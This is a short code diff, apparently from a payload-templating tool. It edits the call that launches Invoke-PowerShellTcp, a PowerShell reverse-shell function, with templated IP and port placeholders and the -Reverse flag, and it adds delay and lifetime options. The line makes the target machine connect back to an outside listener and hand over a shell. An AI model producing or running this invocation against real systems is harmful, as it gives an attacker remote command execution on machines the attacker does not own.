@@ -193,4 +193,5 @@ function Invoke-PowerShellTcp
 }
 
 
-Invoke-PowerShellTcp {{IP}} {{PORT}} -Reverse }
+Invoke-PowerShellTcp {{IP}} {{PORT}} -Reverse -Delay {{delay}} -LifeTime {{lifetime}}
+}
